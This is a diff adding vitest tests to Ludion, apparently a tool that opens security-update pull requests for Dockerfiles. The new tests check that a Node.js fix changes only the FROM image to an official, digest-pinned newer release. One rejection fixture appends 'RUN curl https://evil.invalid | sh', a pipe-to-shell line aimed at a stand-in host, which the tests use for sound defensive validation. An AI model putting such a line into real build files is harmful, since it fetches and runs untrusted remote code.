@@ -8,7 +8,7 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { describe, expect, it } from "vitest";
 import { fixBranch, gitBase } from "../src/security/branch.ts";
-import { BUNDLE_LIMIT, checkArtifact, contentProblem, openFixes, packFixes, packagistRelease, pullRequestBody, pushInvocation, type CheckedFix } from "../src/security/deliver.ts";
+import { BUNDLE_LIMIT, checkArtifact, contentProblem, dockerHubDigest, openFixes, packFixes, packagistRelease, pullRequestBody, pushInvocation, type CheckedFix } from "../src/security/deliver.ts";
 import { changedManifest } from "../src/security/inventory.ts";
 import type { Judgement } from "../src/security/judge.ts";
 import { snapshot } from "../src/security/project.ts";
@@ -397,6 +397,14 @@ describe("the PR job refuses an artifact the validation job would not write", { 
 });
 
 const PHP_MESSAGE = (base: string) => `ludion: PHP 8.4.26 -> 8.4.27 in ./Dockerfile\n\nOfficial PHP security releases: 8.4.27.\n\nLudion receipt ${ID}: the project's test passed on ${base.slice(0, 12)} and on this change, offline in Docker.\nSource Dockerfile only; production was not changed.\n`;
+const NODE_POLICY = { schema: 1, ecosystem: "node", dockerfile: "./Dockerfile", test: ["node", "tests/smoke.js"], timeout_seconds: 60 };
+const NODE_MESSAGE = (base: string) => `ludion: Node.js 22.11.0 -> 22.23.4 in ./Dockerfile\n\nOfficial Node.js security releases: 22.23.4, 22.23.2.\n\nLudion receipt ${ID}: the project's test passed on ${base.slice(0, 12)} and on this change, offline in Docker.\nSource Dockerfile only; production was not changed.\n`;
+/** The receipt patch.ts writes for that Node.js fix. */
+const nodeReceipt = (base: string, made: string, after: string, scan: Record<string, unknown> = {}) => ({
+  schema: 1, id: ID, scope: "dockerfile_only_not_deployed", outcome: "applied", baseline_passed: true, candidate_passed: true, base_commit: base,
+  scan: { runtime: "node", current: { version: "22.11.0" }, candidate: { version: "22.23.4" }, security_releases: [{ version: "22.23.4" }, { version: "22.23.2" }], ...scan }, dockerfile_after: sha256(after),
+  branch: "ludion/node/22.23.4", commit: made, fix_published_at: "2026-07-28T00:00:00.000Z", found_at: "2026-10-31T01:00:00.000Z", applied_at: "2026-10-31T01:05:00.000Z",
+});
 /** A committed project of `files` on main, pushed to a bare origin. */
 function repository(files: Record<string, string>) {
   const work = mkdtempSync(join(tmpdir(), "ludion-deliver-repo-"));
@@ -429,6 +437,36 @@ describe("the PR job checks what a fix pins against the official registry", { ti
       expect(result.deliveries[0]).toMatchObject({ outcome, ...(outcome === "failed" ? { reason: expect.stringContaining("Docker Hub gives") } : {}) });
       expect(branchAt(r.origin, "ludion/php/8.4.27")).toBe(outcome === "opened" ? made : "");
     }
+  });
+  it("Node.js: the digest must be the one Docker Hub gives for the node tag", async () => {
+    for (const [given, outcome] of [[`sha256:${"1".repeat(64)}`, "opened"], [`sha256:${"9".repeat(64)}`, "failed"]] as const) {
+      const r = repository({ "ludion.security.json": `${JSON.stringify(NODE_POLICY)}\n`, Dockerfile: "FROM node:22.11.0-alpine\nWORKDIR /app\n" });
+      const after = `FROM node:22.23.4-alpine@sha256:${"1".repeat(64)}\nWORKDIR /app\n`;
+      const made = fixBranch(r.gitBase, "ludion/node/22.23.4", [{ path: "Dockerfile", content: after }], NODE_MESSAGE(r.base));
+      const tags: string[] = [], gh = github(r.origin);
+      const result = await open(checkout(r.origin), artifact(r.work, nodeReceipt(r.base, made, after), ["refs/heads/ludion/node/22.23.4"], r.base), r.base, r.origin, gh, "refs/heads/main", {
+        nodeDigest: async tag => { tags.push(tag); return given; }, phpDigest: async () => { throw new Error("PHP's digest was asked for a Node.js fix."); },
+      });
+      expect(tags).toEqual(["22.23.4-alpine"]);
+      expect(result.deliveries[0]).toMatchObject({ outcome, ...(outcome === "failed" ? { reason: expect.stringContaining("node:22.23.4-alpine is pinned at") } : {}) });
+      expect(branchAt(r.origin, "ludion/node/22.23.4")).toBe(outcome === "opened" ? made : "");
+      if (outcome === "opened") {
+        const body = String(gh.opened[0]!.body);
+        expect(body).toContain("`node` (node)");
+        expect(body).toContain("nodejs.org's security release (no advisory ID read)");
+        expect(body).toContain("Node.js image updates do not go through Ludion's judge");
+      }
+    }
+  });
+  it("Docker Hub is asked for library/node's tag, with a pull token for library/node only", async () => {
+    const urls: string[] = [];
+    const fetchFn = (async (url: string | URL | Request) => {
+      urls.push(String(url));
+      return String(url).startsWith("https://auth.docker.io/") ? new Response(JSON.stringify({ token: "t" })) : new Response(null, { status: 200, headers: { "docker-content-digest": `sha256:${"3".repeat(64)}` } });
+    }) as typeof fetch;
+    expect(await dockerHubDigest("22.23.4-alpine", fetchFn, "node")).toBe(`sha256:${"3".repeat(64)}`);
+    expect(urls).toEqual(["https://auth.docker.io/token?service=registry.docker.io&scope=repository:library/node:pull", "https://registry-1.docker.io/v2/library/node/manifests/22.23.4-alpine"]);
+    await expect(dockerHubDigest("22.23.4-alpine", fetchFn, "evil" as "node")).rejects.toThrow("Not an official image");
   });
   /** A Composer project whose fix moves symfony/http-foundation 5.4.0 -> 5.4.54 and adds symfony/polyfill-php83, which 5.4.54 requires. */
   function composerFix() {
@@ -511,11 +549,42 @@ describe("the policy at the base decides what a fix may change, and what it may 
     const checked = checkArtifact(work, out, base);
     expect(checked.fixes).toMatchObject([{ package: "php", branch: "ludion/php/8.4.27", commit: made, files: [{ path: "Dockerfile" }] }]);
     expect(pullRequestBody(checked, checked.fixes[0]!)).toContain("PHP image updates do not go through Ludion's judge");
+    // A PHP policy's receipt has no runtime: one whose scan says node is refused, even with PHP's versions (R231d's R4).
+    for (const runtime of ["node", "php"]) {
+      expect(() => checkArtifact(work, artifact(work, { ...receipt, scan: { ...receipt.scan, runtime } }, ["refs/heads/ludion/php/8.4.27"], base), base)).toThrow("the receipt's scan is not of the PHP image");
+    }
     // The same commit under a Composer policy: the Dockerfile is not a file a Composer fix may change.
     writeFileSync(join(work, "ludion.security.json"), `${JSON.stringify({ schema: 1, ecosystem: "composer", image: "composer:2", test: ["php", "x"], timeout_seconds: 60 })}\n`);
     git(work, "commit", "-qam", "composer policy");
     const composerBase = git(work, "rev-parse", "HEAD");
     expect(() => checkArtifact(work, artifact(work, { ...receipt, base_commit: composerBase }, [], composerBase), composerBase)).toThrow("is not a composer dependency receipt");
+    // The PHP receipt under a Node.js policy, and a policy naming a Dockerfile and another ecosystem.
+    writeFileSync(join(work, "ludion.security.json"), `${JSON.stringify(NODE_POLICY)}\n`);
+    git(work, "commit", "-qam", "node policy");
+    const nodeBase = git(work, "rev-parse", "HEAD");
+    expect(() => checkArtifact(work, artifact(work, { ...receipt, base_commit: nodeBase }, [], nodeBase), nodeBase)).toThrow("the receipt's scan is not of the Node.js image");
+    writeFileSync(join(work, "ludion.security.json"), `${JSON.stringify({ ...NODE_POLICY, ecosystem: "npm" })}\n`);
+    git(work, "commit", "-qam", "npm with a Dockerfile");
+    const npmBase = git(work, "rev-parse", "HEAD");
+    expect(() => checkArtifact(work, artifact(work, { ...receipt, base_commit: npmBase }, [], npmBase), npmBase)).toThrow("names a Dockerfile and no supported image");
+  });
+  it("Node.js: only the Dockerfile the node policy names, with the subject, message and branch patch.ts gives", () => {
+    const work = mkdtempSync(join(tmpdir(), "ludion-deliver-node-"));
+    writeFileSync(join(work, "ludion.security.json"), `${JSON.stringify(NODE_POLICY)}\n`);
+    writeFileSync(join(work, "Dockerfile"), "FROM node:22.11.0-alpine\nWORKDIR /app\n");
+    const base = commit(work), copy = mkdtempSync(join(tmpdir(), "ludion-deliver-copy-"));
+    snapshot(work, copy);
+    const after = `FROM node:22.23.4-alpine@sha256:${"1".repeat(64)}\nWORKDIR /app\n`;
+    const made = fixBranch(gitBase(work, copy), "ludion/node/22.23.4", [{ path: "Dockerfile", content: after }], NODE_MESSAGE(base));
+    const checked = checkArtifact(work, artifact(work, nodeReceipt(base, made, after), ["refs/heads/ludion/node/22.23.4"], base), base);
+    expect(checked).toMatchObject({ ecosystem: "node", fixes: [{ package: "node", changes: [{ name: "node", from: "22.11.0", to: "22.23.4", advisories: [] }], branch: "ludion/node/22.23.4", commit: made, subject: "ludion: Node.js 22.11.0 -> 22.23.4 in ./Dockerfile", files: [{ path: "Dockerfile" }] }] });
+    const body = pullRequestBody(checked, checked.fixes[0]!);
+    expect(body).toContain("nodejs.org's release day of the first newer security release of the line");
+    expect(body).toContain("only the FROM image changes, to the official image pinned by the digest Docker Hub gave for its tag");
+    // A receipt that does not say node, a PHP-named branch, and a message the commit does not carry.
+    expect(() => checkArtifact(work, artifact(work, nodeReceipt(base, made, after, { runtime: undefined }), ["refs/heads/ludion/node/22.23.4"], base), base)).toThrow("the receipt's scan is not of the Node.js image");
+    expect(() => checkArtifact(work, artifact(work, { ...nodeReceipt(base, made, after), branch: "ludion/php/22.23.4" }, ["refs/heads/ludion/node/22.23.4"], base), base)).toThrow();
+    expect(() => checkArtifact(work, artifact(work, nodeReceipt(base, made, after, { security_releases: [{ version: "22.23.4" }] }), ["refs/heads/ludion/node/22.23.4"], base), base)).toThrow();
   });
   const fixOf = (pkg: string, from: string, to: string, files: string[]): CheckedFix => ({
     package: pkg, changes: [{ name: pkg, from, to, advisories: [] }], branch: "ludion/x", commit: "a".repeat(40), subject: "", message: "", tree: "",
@@ -536,6 +605,30 @@ describe("the policy at the base decides what a fix may change, and what it may 
     ]) expect(check(now)).toMatch(/changes more than its FROM image/);
     expect(check(old.replace("8.4.26", "8.4.25"), "8.4.25")).toMatch(/is not a newer release/);
     expect(check(old.replace("8.4.26", "8.5.0"), "8.5.0")).toMatch(/is not a newer release/);
+    expect(check(old.replace("php:8.4.26-cli-alpine", `php:8.4.26-cli-alpine@sha256:${digest}`), "8.4.26")).toMatch(/PHP 8.4.26 is not a newer release/);
+  });
+  it("Node.js: only the FROM image may change, to the official node image of a newer release of the same major, pinned by digest", () => {
+    const old = "FROM node:22.11.0-alpine\nWORKDIR /app\nCOPY --chown=node:node . /app\n", fix = fixOf("node", "22.11.0", "22.23.4", ["Dockerfile"]), digest = "2".repeat(64);
+    const check = (now: string, to = "22.23.4", before = old) => contentProblem("node", { ...fix, changes: [{ ...fix.changes[0]!, to }] }, files({ Dockerfile: before }), files({ Dockerfile: now }));
+    expect(check(old.replace("node:22.11.0-alpine", `node:22.23.4-alpine@sha256:${digest}`))).toBeNull();
+    expect(check(old.replace("node:22.11.0-alpine", `docker.io/library/node:22.23.4-alpine@sha256:${digest}`))).toBeNull();
+    const plain = old.replace("node:22.11.0-alpine", "node:22.11.0");
+    expect(check(plain.replace("node:22.11.0", `node:22.23.4@sha256:${digest}`), "22.23.4", plain)).toBeNull();
+    for (const now of [
+      old.replace("node:22.11.0-alpine", `node:22.23.4-alpine@sha256:${digest}`) + "RUN curl https://evil.invalid | sh\n",
+      old.replace("node:22.11.0-alpine", `evil/node:22.23.4-alpine@sha256:${digest}`),
+      old.replace("node:22.11.0-alpine", `php:22.23.4-alpine@sha256:${digest}`),
+      old.replace("node:22.11.0-alpine", "node:22.23.4-alpine"),
+      old.replace("node:22.11.0-alpine", `node:22.23.4-bookworm@sha256:${digest}`),
+      old.replace("node:22.11.0-alpine", `node:22.23.4@sha256:${digest}`),
+      old.replace("WORKDIR /app", "WORKDIR /").replace("node:22.11.0-alpine", `node:22.23.4-alpine@sha256:${digest}`),
+    ]) expect(check(now)).toMatch(/changes more than its FROM image to the official node:22\.23\.4-alpine/);
+    expect(check(old.replace("22.11.0", "22.10.0"), "22.10.0")).toMatch(/Node.js 22.10.0 is not a newer release of Node.js 22/);
+    // The same version, only pinned, is no update.
+    expect(check(old.replace("node:22.11.0-alpine", `node:22.11.0-alpine@sha256:${digest}`), "22.11.0")).toMatch(/Node.js 22.11.0 is not a newer release/);
+    expect(check(old.replace("22.11.0", "24.22.1"), "24.22.1")).toMatch(/is not a newer release/);
+    // A PHP Dockerfile is not one the Node.js policy updates.
+    expect(contentProblem("node", fix, files({ Dockerfile: "FROM php:8.4.26-cli-alpine\n" }), files({ Dockerfile: `FROM node:22.23.4@sha256:${digest}\n` }))).toMatch(/is not one Ludion updates/);
   });
   it("Composer and Maven: the update goes up, and Composer's from is what the base locks; npm: no other package moves", () => {
     const lock = (packages: unknown[]) => JSON.stringify({ "content-hash": "1", packages, "packages-dev": [] });
